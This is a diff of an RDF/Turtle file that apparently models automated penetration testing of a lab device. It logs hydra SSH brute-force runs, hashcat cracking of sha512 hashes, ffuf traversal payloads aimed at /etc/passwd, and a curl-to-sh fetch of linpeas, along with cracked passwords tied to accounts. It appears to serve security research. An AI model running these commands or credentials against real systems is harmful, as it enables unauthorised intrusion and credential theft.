@@ -4,8 +4,8 @@
 
 ns2:Account2 a ns2:Account ;
     ns2:accountUsername "root" ;
-    ns2:scanInfo ns2:Scan16,
-        ns2:Scan5 .
+    ns2:scanInfo ns2:Scan14,
+        ns2:Scan4 .
 
 ns2:Firmware1 a ns2:Firmware ;
     ns2:firmwarePath "~/Downloads/studentv2" .
@@ -13,421 +13,133 @@ ns2:Firmware1 a ns2:Firmware ;
 ns2:Hash1 a ns2:Hash ;
     ns2:hashFunction "sha512" ;
     ns2:hashValue "$6$WQBiS3eMvOMsmsDy$nebw3AB8weP3mqP/1qqcJsN/Xh.CW5S2hsSHMVSxdH5sqEMdJZzzDfmcoBeZeNNh43JqXSquoRES3D4bgxKBy." ;
-    ns2:scanInfo ns2:Scan16,
-        ns2:Scan5 .
+    ns2:scanInfo ns2:Scan14,
+        ns2:Scan4 .
 
 ns2:IpAddress1 a ns2:IpAddress ;
     ns2:addressPort ns2:Port1,
-        ns2:Port2,
-        ns2:Port3 ;
+        ns2:Port2 ;
     ns2:ipv4 "192.168.0.102" .
 
-ns2:Scan1 a ns2:Scan ;
-    ns2:command "sudo nmap -sU 192.168.0.102" ;
-    ns2:epochTime 1.687529e+09 ;
-    ns2:scanInput ns2:Input1 ;
-    ns2:scanProfile ns1:Profile7 .
-
-ns2:Scan11 a ns2:Scan ;
+ns2:Scan10 a ns2:Scan ;
     ns2:command "hydra -l root -p password1 ssh://192.168.0.102:22" ;
-    ns2:epochTime 1.687529e+09 ;
+    ns2:epochTime 1.687812e+09 ;
     ns2:scanInput ns2:Input1,
         ns2:Input11,
         ns2:Input3,
         ns2:Input5 ;
-    ns2:scanProfile ns1:Profile14 .
+    ns2:scanProfile ns1:Profile13 .
 
 ns2:Scan15 a ns2:Scan ;
-    ns2:command "ffuf -ac -u http://192.168.0.102:80/admin?FUZZ=../../../../etc/passwd -w wordlists/parameter-names.txt" ;
-    ns2:epochTime 1.687529e+09 ;
-    ns2:scanInput ns2:Input1,
-        ns2:Input12,
-        ns2:Input13 ;
-    ns2:scanProfile ns1:Profile11 .
+    ns2:command "hashcat '$6$WQBiS3eMvOMsmsDy$nebw3AB8weP3mqP/1qqcJsN/Xh.CW5S2hsSHMVSxdH5sqEMdJZzzDfmcoBeZeNNh43JqXSquoRES3D4bgxKBy.' /usr/share/wordlists/rockyou.txt --show" ;
+    ns2:duration 3.2626e+02 ;
+    ns2:epochTime 1.687813e+09 ;
+    ns2:executionTime "22:48 26/06/2023" ;
+    ns2:scanInput ns2:Input8 ;
+    ns2:scanProfile ns1:Profile16 .
 
 ns2:Scan17 a ns2:Scan ;
-    ns2:command "hashcat '$6$WQBiS3eMvOMsmsDy$nebw3AB8weP3mqP/1qqcJsN/Xh.CW5S2hsSHMVSxdH5sqEMdJZzzDfmcoBeZeNNh43JqXSquoRES3D4bgxKBy.' /usr/share/wordlists/rockyou.txt --show" ;
-    ns2:duration 1.75087e+03 ;
-    ns2:epochTime 1.687529e+09 ;
-    ns2:executionTime "16:09 23/06/2023" ;
-    ns2:scanInput ns2:Input7 ;
-    ns2:scanProfile ns1:Profile17 .
-
-ns2:Scan19 a ns2:Scan ;
     ns2:command "hydra -l root -p devpass ssh://192.168.0.102:22" ;
-    ns2:epochTime 1.687529e+09 ;
+    ns2:epochTime 1.687813e+09 ;
     ns2:scanInput ns2:Input1,
         ns2:Input3,
         ns2:Input5,
         ns2:Input6 ;
-    ns2:scanProfile ns1:Profile14 .
+    ns2:scanProfile ns1:Profile13 .
 
-ns2:Scan20 a ns2:Scan ;
+ns2:Scan18 a ns2:Scan ;
     ns2:command "hydra -l manager -p devpass ssh://192.168.0.102:22" ;
-    ns2:epochTime 1.687529e+09 ;
+    ns2:epochTime 1.687813e+09 ;
     ns2:scanInput ns2:Input1,
         ns2:Input3,
         ns2:Input6,
-        ns2:Input8 ;
-    ns2:scanProfile ns1:Profile14 .
+        ns2:Input7 ;
+    ns2:scanProfile ns1:Profile13 .
 
-ns2:Scan22 a ns2:Scan ;
+ns2:Scan20 a ns2:Scan ;
     ns2:command "hydra -l root -p password1 ssh://192.168.0.102:22" ;
-    ns2:epochTime 1.687529e+09 ;
+    ns2:epochTime 1.687813e+09 ;
     ns2:scanInput ns2:Input1,
         ns2:Input11,
         ns2:Input3,
         ns2:Input5 ;
-    ns2:scanProfile ns1:Profile14 .
-
-ns2:Scan23 a ns2:Scan ;
-    ns2:command "sudo nmap -sU 192.168.0.102" ;
-    ns2:epochTime 1.687529e+09 ;
-    ns2:scanInput ns2:Input1 ;
-    ns2:scanProfile ns1:Profile7 .
-
-ns2:Scan25 a ns2:Scan ;
-    ns2:command "ffuf -ac -u http://192.168.0.102:80/cgi-bin/?FUZZ=../../../../etc/passwd -w wordlists/parameter-names.txt" ;
-    ns2:epochTime 1.687529e+09 ;
-    ns2:scanInput ns2:Input1,
-        ns2:Input12,
-        ns2:Input14 ;
-    ns2:scanProfile ns1:Profile11 .
-
-ns2:Scan26 a ns2:Scan ;
-    ns2:command "hydra -C wordlists/default_credentials/ssh_pwd.txt ssh://192.168.0.102:22" ;
-    ns2:epochTime 1.687529e+09 ;
-    ns2:scanInput ns2:Input1,
-        ns2:Input3 ;
     ns2:scanProfile ns1:Profile13 .
 
-ns2:Scan31 a ns2:Scan ;
-    ns2:command "ffuf -ac -u http://192.168.0.102:80/cgi-bin/LFI.cgi?censortest=FUZZ -w wordlists/input_fuzzing.txt" ;
-    ns2:epochTime 1.687529e+09 ;
-    ns2:scanInput ns2:Input1,
-        ns2:Input12,
-        ns2:Input15,
-        ns2:Input19 ;
-    ns2:scanProfile ns1:Profile12 .
-
-ns2:Scan32 a ns2:Scan ;
-    ns2:command "ffuf -ac -u http://192.168.0.102:80/cgi-bin/LFI.cgi?contest=FUZZ -w wordlists/input_fuzzing.txt" ;
-    ns2:epochTime 1.687529e+09 ;
-    ns2:scanInput ns2:Input1,
-        ns2:Input12,
-        ns2:Input15,
-        ns2:Input20 ;
-    ns2:scanProfile ns1:Profile12 .
-
-ns2:Scan33 a ns2:Scan ;
-    ns2:command "ffuf -ac -u http://192.168.0.102:80/cgi-bin/LFI.cgi?imaptest=FUZZ -w wordlists/input_fuzzing.txt" ;
-    ns2:epochTime 1.687529e+09 ;
-    ns2:scanInput ns2:Input1,
-        ns2:Input12,
-        ns2:Input15,
-        ns2:Input21 ;
-    ns2:scanProfile ns1:Profile12 .
-
-ns2:Scan34 a ns2:Scan ;
-    ns2:command "ffuf -ac -u http://192.168.0.102:80/cgi-bin/LFI.cgi?latest=FUZZ -w wordlists/input_fuzzing.txt" ;
-    ns2:epochTime 1.687529e+09 ;
-    ns2:scanInput ns2:Input1,
-        ns2:Input12,
-        ns2:Input15,
-        ns2:Input22 ;
-    ns2:scanProfile ns1:Profile12 .
-
-ns2:Scan35 a ns2:Scan ;
-    ns2:command "ffuf -ac -u http://192.168.0.102:80/cgi-bin/LFI.cgi?savetest=FUZZ -w wordlists/input_fuzzing.txt" ;
-    ns2:epochTime 1.687529e+09 ;
-    ns2:scanInput ns2:Input1,
-        ns2:Input12,
-        ns2:Input15,
-        ns2:Input23 ;
-    ns2:scanProfile ns1:Profile12 .
-
-ns2:Scan36 a ns2:Scan ;
-    ns2:command "ffuf -ac -u http://192.168.0.102:80/cgi-bin/LFI.cgi?test=FUZZ -w wordlists/input_fuzzing.txt" ;
-    ns2:epochTime 1.687529e+09 ;
-    ns2:scanInput ns2:Input1,
-        ns2:Input12,
-        ns2:Input15,
-        ns2:Input24 ;
-    ns2:scanProfile ns1:Profile12 .
-
-ns2:Scan37 a ns2:Scan ;
-    ns2:command "ffuf -ac -u http://192.168.0.102:80/cgi-bin/script.cgi?FUZZ=../../../../etc/passwd -w wordlists/parameter-names.txt" ;
-    ns2:epochTime 1.68753e+09 ;
-    ns2:scanInput ns2:Input1,
-        ns2:Input12,
-        ns2:Input25 ;
-    ns2:scanProfile ns1:Profile11 .
-
-ns2:Scan38 a ns2:Scan ;
-    ns2:command "ffuf -ac -u http://192.168.0.102:80/logout?FUZZ=../../../../etc/passwd -w wordlists/parameter-names.txt" ;
-    ns2:epochTime 1.68753e+09 ;
-    ns2:scanInput ns2:Input1,
-        ns2:Input12,
-        ns2:Input26 ;
-    ns2:scanProfile ns1:Profile11 .
-
-ns2:Scan39 a ns2:Scan ;
-    ns2:command "ffuf -ac -u http://192.168.0.102:80/login?FUZZ=../../../../etc/passwd -w wordlists/parameter-names.txt" ;
-    ns2:epochTime 1.68753e+09 ;
-    ns2:scanInput ns2:Input1,
-        ns2:Input12,
-        ns2:Input27 ;
-    ns2:scanProfile ns1:Profile11 .
-
-ns2:Scan4 a ns2:Scan ;
+ns2:Scan21 a ns2:Scan ;
     ns2:command "hydra -C wordlists/default_credentials/ssh_pwd.txt ssh://192.168.0.102:22" ;
-    ns2:epochTime 1.687529e+09 ;
+    ns2:epochTime 1.687813e+09 ;
     ns2:scanInput ns2:Input1,
         ns2:Input3 ;
-    ns2:scanProfile ns1:Profile13 .
-
-ns2:Scan40 a ns2:Scan ;
-    ns2:command "ffuf -ac -u http://192.168.0.102:80/profile?FUZZ=../../../../etc/passwd -w wordlists/parameter-names.txt" ;
-    ns2:epochTime 1.68753e+09 ;
-    ns2:scanInput ns2:Input1,
-        ns2:Input12,
-        ns2:Input28 ;
-    ns2:scanProfile ns1:Profile11 .
-
-ns2:Scan41 a ns2:Scan ;
-    ns2:command "ffuf -ac -u http://192.168.0.102:80/server-status?FUZZ=../../../../etc/passwd -w wordlists/parameter-names.txt" ;
-    ns2:epochTime 1.68753e+09 ;
-    ns2:scanInput ns2:Input1,
-        ns2:Input12,
-        ns2:Input29 ;
-    ns2:scanProfile ns1:Profile11 .
-
-ns2:Scan42 a ns2:Scan ;
-    ns2:command "ffuf -ac -u http://192.168.0.102:80/cgi-bin/run.cgi?dxparam=FUZZ -w wordlists/input_fuzzing.txt" ;
-    ns2:epochTime 1.68753e+09 ;
-    ns2:scanInput ns2:Input1,
-        ns2:Input12,
-        ns2:Input16,
-        ns2:Input18 ;
     ns2:scanProfile ns1:Profile12 .
 
-ns2:Scan43 a ns2:Scan ;
-    ns2:command "ffuf -ac -u http://192.168.0.102:80/cgi-bin/run.cgi?param=FUZZ -w wordlists/input_fuzzing.txt" ;
-    ns2:epochTime 1.68753e+09 ;
+ns2:Scan3 a ns2:Scan ;
+    ns2:command "hydra -C wordlists/default_credentials/ssh_pwd.txt ssh://192.168.0.102:22" ;
+    ns2:epochTime 1.687812e+09 ;
     ns2:scanInput ns2:Input1,
-        ns2:Input12,
-        ns2:Input17,
-        ns2:Input18 ;
+        ns2:Input3 ;
     ns2:scanProfile ns1:Profile12 .
 
-ns2:Scan44 a ns2:Scan ;
-    ns2:command "ffuf -ac -u http://192.168.0.102:80/cgi-bin/run.cgi?censortest=FUZZ -w wordlists/input_fuzzing.txt" ;
-    ns2:epochTime 1.68753e+09 ;
-    ns2:scanInput ns2:Input1,
-        ns2:Input12,
-        ns2:Input18,
-        ns2:Input19 ;
-    ns2:scanProfile ns1:Profile12 .
-
-ns2:Scan45 a ns2:Scan ;
-    ns2:command "ffuf -ac -u http://192.168.0.102:80/cgi-bin/run.cgi?contest=FUZZ -w wordlists/input_fuzzing.txt" ;
-    ns2:epochTime 1.68753e+09 ;
-    ns2:scanInput ns2:Input1,
-        ns2:Input12,
-        ns2:Input18,
-        ns2:Input20 ;
-    ns2:scanProfile ns1:Profile12 .
-
-ns2:Scan46 a ns2:Scan ;
-    ns2:command "ffuf -ac -u http://192.168.0.102:80/cgi-bin/run.cgi?imaptest=FUZZ -w wordlists/input_fuzzing.txt" ;
-    ns2:epochTime 1.68753e+09 ;
-    ns2:scanInput ns2:Input1,
-        ns2:Input12,
-        ns2:Input18,
-        ns2:Input21 ;
-    ns2:scanProfile ns1:Profile12 .
-
-ns2:Scan47 a ns2:Scan ;
-    ns2:command "ffuf -ac -u http://192.168.0.102:80/cgi-bin/run.cgi?latest=FUZZ -w wordlists/input_fuzzing.txt" ;
-    ns2:epochTime 1.68753e+09 ;
-    ns2:scanInput ns2:Input1,
-        ns2:Input12,
-        ns2:Input18,
-        ns2:Input22 ;
-    ns2:scanProfile ns1:Profile12 .
-
-ns2:Scan48 a ns2:Scan ;
-    ns2:command "ffuf -ac -u http://192.168.0.102:80/cgi-bin/run.cgi?savetest=FUZZ -w wordlists/input_fuzzing.txt" ;
-    ns2:epochTime 1.68753e+09 ;
-    ns2:scanInput ns2:Input1,
-        ns2:Input12,
-        ns2:Input18,
-        ns2:Input23 ;
-    ns2:scanProfile ns1:Profile12 .
-
-ns2:Scan49 a ns2:Scan ;
-    ns2:command "ffuf -ac -u http://192.168.0.102:80/cgi-bin/run.cgi?test=FUZZ -w wordlists/input_fuzzing.txt" ;
-    ns2:epochTime 1.68753e+09 ;
-    ns2:scanInput ns2:Input1,
-        ns2:Input12,
-        ns2:Input18,
-        ns2:Input24 ;
-    ns2:scanProfile ns1:Profile12 .
-
-ns2:Scan6 a ns2:Scan ;
+ns2:Scan5 a ns2:Scan ;
     ns2:command "hydra -l root -p devpass ssh://192.168.0.102:22" ;
-    ns2:epochTime 1.687529e+09 ;
+    ns2:epochTime 1.687812e+09 ;
     ns2:scanInput ns2:Input1,
         ns2:Input3,
         ns2:Input5,
         ns2:Input6 ;
-    ns2:scanProfile ns1:Profile14 .
+    ns2:scanProfile ns1:Profile13 .
+
+ns2:Scan6 a ns2:Scan ;
+    ns2:command "hydra -l manager -p devpass ssh://192.168.0.102:22" ;
+    ns2:epochTime 1.687812e+09 ;
+    ns2:scanInput ns2:Input1,
+        ns2:Input3,
+        ns2:Input6,
+        ns2:Input7 ;
+    ns2:scanProfile ns1:Profile13 .
 
 ns2:Scan7 a ns2:Scan ;
     ns2:command "hashcat '$6$WQBiS3eMvOMsmsDy$nebw3AB8weP3mqP/1qqcJsN/Xh.CW5S2hsSHMVSxdH5sqEMdJZzzDfmcoBeZeNNh43JqXSquoRES3D4bgxKBy.' /usr/share/wordlists/rockyou.txt --show" ;
-    ns2:duration 1.79265e+03 ;
-    ns2:epochTime 1.687529e+09 ;
-    ns2:executionTime "16:06 23/06/2023" ;
-    ns2:scanInput ns2:Input7 ;
-    ns2:scanProfile ns1:Profile17 .
+    ns2:duration 3.4053e+02 ;
+    ns2:epochTime 1.687812e+09 ;
+    ns2:executionTime "22:44 26/06/2023" ;
+    ns2:scanInput ns2:Input8 ;
+    ns2:scanProfile ns1:Profile16 .
 
-ns2:Scan8 a ns2:Scan ;
-    ns2:command "hydra -l manager -p devpass ssh://192.168.0.102:22" ;
-    ns2:epochTime 1.687529e+09 ;
-    ns2:scanInput ns2:Input1,
-        ns2:Input3,
-        ns2:Input6,
-        ns2:Input8 ;
-    ns2:scanProfile ns1:Profile14 .
-
-ns2:WebInput1 a ns2:WebInput ;
-    ns2:inputValue "../../../../../../../../../../../../etc/hosts" ;
-    ns2:scanInfo ns2:Scan28,
-        ns2:Scan29 .
-
-ns2:WebInput2 a ns2:WebInput ;
-    ns2:inputValue "../../../../../../../../../../../../etc/passwd" ;
-    ns2:scanInfo ns2:Scan28,
-        ns2:Scan29 .
-
-ns2:WebInput3 a ns2:WebInput ;
-    ns2:inputValue "/" ;
-    ns2:scanInfo ns2:Scan28,
-        ns2:Scan29 .
-
-ns2:WebInput4 a ns2:WebInput ;
-    ns2:inputValue "/../../../../../../../../../../etc/passwd" ;
-    ns2:scanInfo ns2:Scan28,
-        ns2:Scan29 .
-
-ns2:WebInput5 a ns2:WebInput ;
-    ns2:inputValue "1" ;
-    ns2:scanInfo ns2:Scan28,
-        ns2:Scan29 .
-
-ns2:WebParameter1 a ns2:WebParameter ;
-    ns2:scanInfo ns2:Scan27 ;
-    ns2:webParameterName "dxparam" ;
-    ns2:webpageParameter ns2:Webpage3 .
-
-ns2:WebParameter2 a ns2:WebParameter ;
-    ns2:scanInfo ns2:Scan27 ;
-    ns2:webParameterName "param" ;
-    ns2:webpageParameter ns2:Webpage3 .
-
-ns2:WebParameter3 a ns2:WebParameter ;
-    ns2:scanInfo ns2:Scan30 ;
-    ns2:webParameterName "censortest" ;
-    ns2:webpageParameter ns2:Webpage4 .
-
-ns2:WebParameter4 a ns2:WebParameter ;
-    ns2:scanInfo ns2:Scan30 ;
-    ns2:webParameterName "contest" ;
-    ns2:webpageParameter ns2:Webpage4 .
-
-ns2:WebParameter5 a ns2:WebParameter ;
-    ns2:scanInfo ns2:Scan30 ;
-    ns2:webParameterName "imaptest" ;
-    ns2:webpageParameter ns2:Webpage4 .
-
-ns2:WebParameter6 a ns2:WebParameter ;
-    ns2:scanInfo ns2:Scan30 ;
-    ns2:webParameterName "latest" ;
-    ns2:webpageParameter ns2:Webpage4 .
-
-ns2:WebParameter7 a ns2:WebParameter ;
-    ns2:scanInfo ns2:Scan30 ;
-    ns2:webParameterName "savetest" ;
-    ns2:webpageParameter ns2:Webpage4 .
-
-ns2:WebParameter8 a ns2:WebParameter ;
-    ns2:scanInfo ns2:Scan30 ;
-    ns2:webParameterName "test" ;
-    ns2:webpageParameter ns2:Webpage4 .
-
-ns2:Webpage1 a ns2:Webpage ;
-    ns2:page "/admin" ;
-    ns2:scanInfo ns2:Scan14,
-        ns2:Scan24 ;
-    ns2:size "605" ;
-    ns2:status "500" .
-
-ns2:Webpage2 a ns2:Webpage ;
-    ns2:page "/cgi-bin/" ;
-    ns2:scanInfo ns2:Scan14,
-        ns2:Scan24 ;
-    ns2:size "416" ;
-    ns2:status "200" .
-
-ns2:Webpage5 a ns2:Webpage ;
-    ns2:page "/cgi-bin/script.cgi" ;
-    ns2:scanInfo ns2:Scan14 ;
-    ns2:size "22" ;
-    ns2:status "200" .
-
-ns2:Webpage6 a ns2:Webpage ;
-    ns2:page "/logout" ;
-    ns2:redirect "/login" ;
-    ns2:scanInfo ns2:Scan14,
-        ns2:Scan24 ;
-    ns2:size "199" ;
-    ns2:status "302" .
-
-ns2:Webpage7 a ns2:Webpage ;
-    ns2:page "/login" ;
-    ns2:scanInfo ns2:Scan14,
-        ns2:Scan24 ;
-    ns2:size "4393" ;
-    ns2:status "200" .
-
-ns2:Webpage8 a ns2:Webpage ;
-    ns2:page "/profile" ;
-    ns2:redirect "/login" ;
-    ns2:scanInfo ns2:Scan14,
-        ns2:Scan24 ;
-    ns2:size "231" ;
-    ns2:status "302" .
-
-ns2:Webpage9 a ns2:Webpage ;
-    ns2:page "/server-status" ;
-    ns2:scanInfo ns2:Scan14,
-        ns2:Scan24 ;
-    ns2:size "276" ;
-    ns2:status "403" .
+ns1:Profile1 a ns1:Profile ;
+    ns1:Command "gobuster dir -u http://<ipv4>:<port>/ -w wordlists/common.txt" ;
+    ns1:hasParameter ns1:Parameter1,
+        ns1:Parameter2 ;
+    ns1:hasRequirement ns1:Requirement1,
+        ns1:Requirement2 ;
+    ns1:hasResult ns1:Result1 ;
+    ns1:profileName "http_dir_scan_small" .
 
 ns1:Profile10 a ns1:Profile ;
-    ns1:Command "sshpass -p <password> ssh <account>@<ipv4>" ;
+    ns1:Command "ffuf -ac -u http://<ipv4>:<port><page>?FUZZ=../../../../etc/passwd -w wordlists/parameter-names.txt" ;
     ns1:hasParameter ns1:Parameter1,
-        ns1:Parameter4,
-        ns1:Parameter5 ;
+        ns1:Parameter2,
+        ns1:Parameter6 ;
     ns1:hasRequirement ns1:Requirement1,
-        ns1:Requirement10,
-        ns1:Requirement11,
-        ns1:Requirement9 ;
-    ns1:hasResult ns1:Result7 ;
-    ns1:profileName "ssh_connection" .
+        ns1:Requirement12,
+        ns1:Requirement13 ;
+    ns1:hasResult ns1:Result8 ;
+    ns1:profileName "http_param_fuzz" .
 
-ns1:Profile15 a ns1:Profile ;
+ns1:Profile11 a ns1:Profile ;
+    ns1:Command "ffuf -ac -u http://<ipv4>:<port><page>?<webparam>=FUZZ -w wordlists/input_fuzzing.txt" ;
+    ns1:hasParameter ns1:Parameter1,
+        ns1:Parameter2,
+        ns1:Parameter6,
+        ns1:Parameter7 ;
+    ns1:hasRequirement ns1:Requirement1,
+        ns1:Requirement12,
+        ns1:Requirement14,
+        ns1:Requirement15,
+        ns1:Requirement16 ;
+    ns1:hasResult ns1:Result9 ;
+    ns1:profileName "http_param_input_fuzz" .
+
+ns1:Profile14 a ns1:Profile ;
     ns1:Command "hydra -C wordlists/default_credentials/test.txt ftp://<ipv4>:<port>" ;
     ns1:hasParameter ns1:Parameter1,
         ns1:Parameter2 ;
@@ -445,6 +157,15 @@ ns1:Profile2 a ns1:Profile ;
         ns1:Requirement3 ;
     ns1:hasResult ns1:Result1 ;
     ns1:profileName "https_dir_scan_small" .
+
+ns1:Profile3 a ns1:Profile ;
+    ns1:Command "gobuster dir -u http://<ipv4>:<port>/ -w wordlists/big.txt" ;
+    ns1:hasParameter ns1:Parameter1,
+        ns1:Parameter2 ;
+    ns1:hasRequirement ns1:Requirement1,
+        ns1:Requirement4 ;
+    ns1:hasResult ns1:Result1 ;
+    ns1:profileName "http_dir_scan_big" .
 
 ns1:Profile4 a ns1:Profile ;
     ns1:Command "gobuster dir -u https://<ipv4>:<port>/ -w wordlists/big.txt" ;
@@ -464,10 +185,22 @@ ns1:Profile5 a ns1:Profile ;
         ns1:Result3 ;
     ns1:profileName "fast_scan" .
 
-ns1:Profile8 a ns1:Profile ;
+ns1:Profile7 a ns1:Profile ;
     ns1:Command "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh" ;
     ns1:hasRequirement ns1:Requirement7 ;
     ns1:profileName "linpeas" .
+
+ns1:Profile9 a ns1:Profile ;
+    ns1:Command "sshpass -p <password> ssh <account>@<ipv4>" ;
+    ns1:hasParameter ns1:Parameter1,
+        ns1:Parameter4,
+        ns1:Parameter5 ;
+    ns1:hasRequirement ns1:Requirement1,
+        ns1:Requirement10,
+        ns1:Requirement11,
+        ns1:Requirement9 ;
+    ns1:hasResult ns1:Result7 ;
+    ns1:profileName "ssh_connection" .
 
 ns1:Tool1 a ns1:Tool ;
     ns1:toolName "gobuster" ;
@@ -504,143 +237,114 @@ ns1:Tool8 a ns1:Tool ;
 ns2:Account1 a ns2:Account ;
     ns2:accountPassword ns2:Password1 ;
     ns2:accountUsername "client" ;
-    ns2:scanInfo ns2:Scan16,
-        ns2:Scan3,
-        ns2:Scan5 .
+    ns2:scanInfo ns2:Scan13,
+        ns2:Scan14,
+        ns2:Scan2,
+        ns2:Scan4 .
 
 ns2:Account3 a ns2:Account ;
     ns2:accountPassword ns2:Password2 ;
     ns2:accountUsername "manager" ;
-    ns2:scanInfo ns2:Scan16,
-        ns2:Scan5 .
+    ns2:scanInfo ns2:Scan14,
+        ns2:Scan4 .
 
 ns2:Hash2 a ns2:Hash ;
     ns2:hashFunction "sha512" ;
     ns2:hashValue "$6$vOsShJfzJ$nspR/.gahnFFRBL9hrTkWCwr8fCjhkIaEyABvCCpCVL6p1G3dZVEhvmbcOg2Bh1OG.a9ZmKkzwo2V5ZDOin73/" ;
-    ns2:scanInfo ns2:Scan16,
-        ns2:Scan5 .
+    ns2:scanInfo ns2:Scan14,
+        ns2:Scan4 .
 
 ns2:Hash3 a ns2:Hash ;
     ns2:hashFunction "sha512" ;
     ns2:hashValue "$6$dY5hO/6B48/9D.66$QHHDlmdkw.CHtzQg.W/e7s8SnGJaJgwVYwKzLu1vB6ZTeKBb2BXj1xc7wJJUl7nFgUXy6AHf/6z63yOPuXBT7/" ;
-    ns2:scanInfo ns2:Scan16,
-        ns2:Scan5 .
-
-ns2:Input13 a ns2:Input ;
-    ns2:ParameterURI "http://www.semanticweb.org/jef/ontologies/2023/demo#Webpage1" .
-
-ns2:Input14 a ns2:Input ;
-    ns2:ParameterURI "http://www.semanticweb.org/jef/ontologies/2023/demo#Webpage2" .
-
-ns2:Input2 a ns2:Input ;
-    ns2:ParameterURI "http://www.semanticweb.org/jef/ontologies/2023/demo#Port2" .
-
-ns2:Input25 a ns2:Input ;
-    ns2:ParameterURI "http://www.semanticweb.org/jef/ontologies/2023/demo#Webpage5" .
-
-ns2:Input26 a ns2:Input ;
-    ns2:ParameterURI "http://www.semanticweb.org/jef/ontologies/2023/demo#Webpage6" .
-
-ns2:Input27 a ns2:Input ;
-    ns2:ParameterURI "http://www.semanticweb.org/jef/ontologies/2023/demo#Webpage7" .
-
-ns2:Input28 a ns2:Input ;
-    ns2:ParameterURI "http://www.semanticweb.org/jef/ontologies/2023/demo#Webpage8" .
-
-ns2:Input29 a ns2:Input ;
-    ns2:ParameterURI "http://www.semanticweb.org/jef/ontologies/2023/demo#Webpage9" .
+    ns2:scanInfo ns2:Scan14,
+        ns2:Scan4 .
 
 ns2:Password1 a ns2:Password ;
     ns2:passwordCleartext "devpass" ;
     ns2:passwordHash ns2:Hash2 ;
-    ns2:scanInfo ns2:Scan18,
-        ns2:Scan3,
-        ns2:Scan9 .
+    ns2:scanInfo ns2:Scan13,
+        ns2:Scan16,
+        ns2:Scan2,
+        ns2:Scan8 .
 
 ns2:Password2 a ns2:Password ;
     ns2:passwordCleartext "password1" ;
     ns2:passwordHash ns2:Hash3 ;
-    ns2:scanInfo ns2:Scan10,
-        ns2:Scan21 .
+    ns2:scanInfo ns2:Scan19,
+        ns2:Scan9 .
 
 ns2:Port1 a ns2:Port ;
     ns2:portNumber "22" ;
     ns2:portService ns2:Service1 ;
     ns2:portStatus "open" ;
-    ns2:scanInfo ns2:Scan13,
-        ns2:Scan2 .
+    ns2:scanInfo ns2:Scan1,
+        ns2:Scan12 .
 
 ns2:Port2 a ns2:Port ;
     ns2:portNumber "23" ;
     ns2:portService ns2:Service2 ;
     ns2:portStatus "open" ;
-    ns2:scanInfo ns2:Scan2 .
+    ns2:scanInfo ns2:Scan1,
+        ns2:Scan12 .
 
-ns2:Port3 a ns2:Port ;
-    ns2:portNumber "80" ;
-    ns2:portService ns2:Service3 ;
-    ns2:portStatus "open" ;
-    ns2:scanInfo ns2:Scan13 .
-
-ns2:Scan10 a ns2:Scan ;
-    ns2:command "hashcat '$6$dY5hO/6B48/9D.66$QHHDlmdkw.CHtzQg.W/e7s8SnGJaJgwVYwKzLu1vB6ZTeKBb2BXj1xc7wJJUl7nFgUXy6AHf/6z63yOPuXBT7/' /usr/share/wordlists/rockyou.txt --show" ;
-    ns2:duration 1.69346e+03 ;
-    ns2:epochTime 1.687529e+09 ;
-    ns2:executionTime "16:06 23/06/2023" ;
-    ns2:scanInput ns2:Input10 ;
-    ns2:scanProfile ns1:Profile17 .
-
-ns2:Scan12 a ns2:Scan ;
+ns2:Scan11 a ns2:Scan ;
     ns2:command "hydra -l manager -p password1 ssh://192.168.0.102:22" ;
-    ns2:duration 1.48431e+03 ;
-    ns2:epochTime 1.687529e+09 ;
-    ns2:executionTime "16:06 23/06/2023" ;
+    ns2:duration 4.1091e+02 ;
+    ns2:epochTime 1.687812e+09 ;
+    ns2:executionTime "22:44 26/06/2023" ;
     ns2:scanInput ns2:Input1,
         ns2:Input11,
         ns2:Input3,
-        ns2:Input8 ;
-    ns2:scanProfile ns1:Profile14 .
+        ns2:Input7 ;
+    ns2:scanProfile ns1:Profile13 .
 
-ns2:Scan18 a ns2:Scan ;
+ns2:Scan16 a ns2:Scan ;
     ns2:command "hashcat '$6$vOsShJfzJ$nspR/.gahnFFRBL9hrTkWCwr8fCjhkIaEyABvCCpCVL6p1G3dZVEhvmbcOg2Bh1OG.a9ZmKkzwo2V5ZDOin73/' /usr/share/wordlists/rockyou.txt --show" ;
-    ns2:duration 1.7468e+03 ;
-    ns2:epochTime 1.687529e+09 ;
-    ns2:executionTime "16:09 23/06/2023" ;
+    ns2:duration 3.2157e+02 ;
+    ns2:epochTime 1.687813e+09 ;
+    ns2:executionTime "22:48 26/06/2023" ;
     ns2:scanInput ns2:Input9 ;
-    ns2:scanProfile ns1:Profile17 .
+    ns2:scanProfile ns1:Profile16 .
 
-ns2:Scan21 a ns2:Scan ;
+ns2:Scan19 a ns2:Scan ;
     ns2:command "hashcat '$6$dY5hO/6B48/9D.66$QHHDlmdkw.CHtzQg.W/e7s8SnGJaJgwVYwKzLu1vB6ZTeKBb2BXj1xc7wJJUl7nFgUXy6AHf/6z63yOPuXBT7/' /usr/share/wordlists/rockyou.txt --show" ;
-    ns2:duration 1.80676e+03 ;
-    ns2:epochTime 1.687529e+09 ;
-    ns2:executionTime "16:09 23/06/2023" ;
+    ns2:duration 3.2115e+02 ;
+    ns2:epochTime 1.687813e+09 ;
+    ns2:executionTime "22:48 26/06/2023" ;
     ns2:scanInput ns2:Input10 ;
-    ns2:scanProfile ns1:Profile17 .
+    ns2:scanProfile ns1:Profile16 .
+
+ns2:Scan8 a ns2:Scan ;
+    ns2:command "hashcat '$6$vOsShJfzJ$nspR/.gahnFFRBL9hrTkWCwr8fCjhkIaEyABvCCpCVL6p1G3dZVEhvmbcOg2Bh1OG.a9ZmKkzwo2V5ZDOin73/' /usr/share/wordlists/rockyou.txt --show" ;
+    ns2:duration 3.3704e+02 ;
+    ns2:epochTime 1.687812e+09 ;
+    ns2:executionTime "22:44 26/06/2023" ;
+    ns2:scanInput ns2:Input9 ;
+    ns2:scanProfile ns1:Profile16 .
 
 ns2:Scan9 a ns2:Scan ;
-    ns2:command "hashcat '$6$vOsShJfzJ$nspR/.gahnFFRBL9hrTkWCwr8fCjhkIaEyABvCCpCVL6p1G3dZVEhvmbcOg2Bh1OG.a9ZmKkzwo2V5ZDOin73/' /usr/share/wordlists/rockyou.txt --show" ;
-    ns2:duration 1.73168e+03 ;
-    ns2:epochTime 1.687529e+09 ;
-    ns2:executionTime "16:06 23/06/2023" ;
-    ns2:scanInput ns2:Input9 ;
-    ns2:scanProfile ns1:Profile17 .
